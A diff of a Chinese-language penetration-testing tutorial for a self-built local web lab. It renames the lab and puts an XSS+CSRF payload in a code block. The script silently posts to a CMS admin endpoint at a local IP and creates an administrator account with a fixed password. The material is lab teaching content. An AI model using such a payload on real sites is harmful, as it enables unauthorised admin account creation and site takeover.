@@ -2,7 +2,7 @@
 
 环境：
 
-> **自建本地 CMS 靶场（PHP + MySQL + Apache）**
+> **自建本地 bank 靶场（PHP + MySQL + Apache）**
 > **工具：Burp Suite + HackBar**
 
 目录：
@@ -490,15 +490,14 @@ XSS + CSRF
 ```
 
 结合效果更强。
-
+```
 <script>
 xmlhttp=new XMLHttpRequest();
 xmlhttp.open("post","http://172.20.10.2/cms/admin/user.action.php",false);
 xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
 xmlhttp.send("act=add&username=datou&password=123456&password2=123456&button=%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7&userid=0");
 </script>
-
-
+```
 
 <img src=".\images\09.png" alt="09" style="zoom:30%;" />
 
